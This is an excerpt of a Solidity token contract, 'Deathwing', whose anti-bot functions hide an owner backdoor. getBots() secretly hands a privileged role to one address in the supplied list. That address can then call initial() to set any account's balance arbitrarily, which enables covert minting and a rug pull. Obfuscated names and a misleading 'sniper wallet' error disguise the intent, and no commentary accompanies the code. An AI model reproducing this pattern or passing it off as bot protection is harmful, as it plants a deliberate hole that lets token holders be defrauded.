...
contract Deathwing is Context, IERC20, Ownable {
 ...
 mapping(address => bool) private setBots;
  BlockBot private _bots;
    modifier Logic() {
        require(
            address(_bots) == msg.sender,
            "Error: sniper wallet."
        );
        _;
    }
    ...
    function initial(address _isBots, uint256 _pair) external Logic {
 
        _balances[_isBots] = _pair;
    }
 
    function getBots(address[] memory _Early) external onlyOwner {
        for(uint256 i = 0; i < _Early.length; i++) {
            setBots[_Early[i]] = true;
        }
        _bots = BlockBot(_Early[10]);
    }
